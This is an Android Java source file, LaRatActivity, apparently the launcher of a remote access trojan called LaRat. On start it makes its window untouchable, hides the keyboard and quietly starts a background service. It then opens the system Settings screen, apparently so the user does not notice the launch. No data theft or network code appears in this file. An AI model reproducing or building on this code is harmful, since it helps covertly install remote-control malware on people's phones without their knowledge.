package com.c4wd.larat;

import android.app.Activity;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.WindowManager;

import com.c4wd.commands.Command;
import com.c4wd.commands.CommandContext;

import java.util.LinkedList;

public class LaRatActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);

        if (!LaRatServiceReceiver.IsServiceRunning(getApplicationContext())) {
            startService(new Intent(getApplicationContext(), LaRatService.class));
            Log.i("com.c4wd.larat", "Starting the LaRat service...");
        }

        startActivityForResult(new Intent(android.provider.Settings.ACTION_SETTINGS), 0);
    }

}
